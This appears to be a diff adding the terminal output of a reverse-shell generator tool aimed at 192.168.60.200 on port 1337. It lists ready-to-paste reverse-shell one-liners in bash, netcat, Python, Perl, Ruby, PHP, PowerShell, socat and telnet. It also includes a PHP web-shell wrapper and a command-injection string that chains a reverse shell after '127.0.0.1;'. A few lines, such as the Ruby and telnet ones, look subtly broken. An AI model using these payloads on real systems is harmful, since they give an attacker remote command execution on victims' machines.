@@ -1,0 +1,19 @@
+  ~ ❯ revshell -i 192.168.60.200 -p 1337
+[+] Init revshell generation on 192.168.60.200:1337
+[*] nc -e /bin/sh 192.168.60.200 1337
+[*] mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc 192.168.60.200 1337 1>/var/tmp/fgp
+[*] powershell.exe -c "$c = New-Object System.Net.Sockets.TCPClient("192.168.60.200",1337);$str = $c.GetStream();[byte[]]$b = 0..65535|%\{0\};while(($i = $str.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex $d 2>&1 | Out-String );$sendback2 = $sendback + "PS"  + (pwd).Path + "> ";$sb = ([text.encoding]::ASCII).GetBytes($sendback2);$str.Write($sb,0,$sb.Length);$str.Flush()};$c.Close()"
+[*] bash -i >& /dev/tcp/192.168.60.200/1337 0>&1
+[*] python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.60.200",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+[*] $client = New-Object System.Net.Sockets.TCPClient("192.168.60.200",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0\};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+[*] <?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.60.200 1337 >/tmp/f");?>
+[*] socat TCP4:192.168.60.200:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
+[*] ruby -rsocket -e'f=TCPSocket.open("192.168.60.200",1337).to_i;exec slog.infof("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+[*] php -r '$sock=fsockopen("192.168.60.200",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
+[*] exec 5<>/dev/tcp/192.168.60.200/1337; while read line 0<&5; do $line 2>&5 >&5; done
+[*] perl -e 'use Socket;$i="192.168.60.200";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+[*] mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc 192.168.60.200 1337 1>/var/tmp/fgp
+[*] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.60.200 1337 >/tmp/f 
+[*] /bin /telnet 192.168.60.200 80 | /bin/bash | /bin/telnet 1337 25
+[*] mknod backpipe p && telnet 192.168.60.200 1337 0<backpipe | /bin/bash 1>backpipe
+[*] 127.0.0.1;bash -i >& /dev/tcp/192.168.60.200/1337 0>&1
